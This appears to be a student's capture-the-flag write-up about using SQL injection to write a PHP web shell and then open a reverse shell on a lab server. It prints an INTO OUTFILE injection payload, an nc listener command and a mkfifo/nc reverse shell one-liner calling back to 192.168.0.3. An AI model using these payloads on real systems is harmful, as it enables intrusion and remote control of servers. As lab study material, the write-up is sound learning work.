flag{3b2000}: Start DATATIME: Sunday End DATATIME: Tuesday. Total time spend: 3h
First of all I started visiting different websites to get in contact with sql and then tried some commands such as searching the different tables of the database. Then I realized 
that I had to exploit the website to get the flag as the webpage has a vulnerability. I used vurhfio' UNION SELECT '', null, null, null INTO OUTFILE '/var/www/html/php/shell.php' -- '
where UNION SELECT is used to combine the results of two SELECT statements. I used an empty string to match the number of columns in the target table.
, null, null, null: These numbers are added to match the number of columns in the target table. After that I saved into a php file doing INTO OUTFILE '/var/www/html/php/shell.php'.
Now that I had the PHP file shell.php, I was able to command execution on the server. 
After that I used a command to open a Netcat listener and make that connection between shells:
nc -nlvp 4444
Access the PHP file via the browser: 10.0.2.186/php/shell.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+192.168.0.3+4444+>/tmp/f and the puted flag also
in the browser to get the final flag.
